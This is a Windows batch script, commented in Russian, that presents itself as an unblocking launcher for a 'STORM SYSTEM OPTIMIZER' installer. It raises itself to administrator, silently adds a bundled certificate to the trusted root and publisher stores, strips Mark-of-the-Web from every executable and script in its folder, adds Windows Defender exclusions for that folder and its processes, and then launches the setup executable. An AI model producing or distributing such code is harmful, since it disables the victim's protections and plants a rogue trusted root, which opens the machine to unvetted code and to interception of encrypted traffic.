@echo off
chcp 65001 >nul
title STORM SYSTEM OPTIMIZER - Разблокировка и Доверие Сертификата

:: ============================================================
:: 1. Проверка и автоматический запрос прав Администратора
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [i] Запрос прав администратора...
    powershell.exe -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ============================================================
echo   STORM SYSTEM OPTIMIZER v1.0.0 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
echo ============================================================
echo.

set "SCRIPT_DIR=%~dp0"
set "CERT_FILE=%SCRIPT_DIR%StormTeamRootCA.cer"

if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%..\StormTeamRootCA.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%STORM_Certificate.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%..\Files\StormTeamRootCA.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%..\StormSoftwareRootCA.cer"
)

:: ============================================================
:: 2. Установка цифрового сертификата STORM TEAM во все хранилища
:: ============================================================
if exist "%CERT_FILE%" (
    echo [1/4] Регистрация доверия цифрового сертификата STORM TEAM...
    certutil.exe -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
    certutil.exe -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
    certutil.exe -addstore -f "AuthRoot" "%CERT_FILE%" >nul 2>&1
    certutil.exe -user -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
    certutil.exe -user -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
    echo [OK] Сертификат STORM TEAM успешно добавлен в Доверенные корневые центры и Издатели!
) else (
    echo [!] Файл сертификата не найден: %CERT_FILE%
)

:: ============================================================
:: 3. Снятие интернет-метки блокировки (Mark-of-the-Web)
:: ============================================================
echo.
echo [2/4] Снятие интернет-меток блокировки (Unblock Mark-of-the-Web)...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%..' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
echo [OK] Все файлы и библиотеки успешно разблокированы!

:: ============================================================
:: 4. Добавление папки программы в исключения Windows Defender
:: ============================================================
echo.
echo [3/4] Добавление папки приложения в доверенную зону Защитника...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%..' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer_Setup_v1.0.0.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo [OK] Исключения и защита от ложных блокировок SmartScreen добавлены!

:: ============================================================
:: 5. Запуск приложения / установщика
:: ============================================================
echo.
echo [4/4] Запуск STORM SYSTEM OPTIMIZER v1.0.0...
echo.
echo ============================================================
echo   ГОТОВО! Приложение разблокировано и готово к работе.
echo ============================================================
echo.

if exist "%SCRIPT_DIR%StormSystemOptimizer_Setup_v1.0.0.exe" (
    start "" "%SCRIPT_DIR%StormSystemOptimizer_Setup_v1.0.0.exe"
) else if exist "%SCRIPT_DIR%..\Assembling\StormSystemOptimizer.exe" (
    start "" "%SCRIPT_DIR%..\Assembling\StormSystemOptimizer.exe"
) else if exist "%SCRIPT_DIR%..\StormSystemOptimizer_Setup_v1.0.0.exe" (
    start "" "%SCRIPT_DIR%..\StormSystemOptimizer_Setup_v1.0.0.exe"
)

timeout /t 3 >nul
exit /b
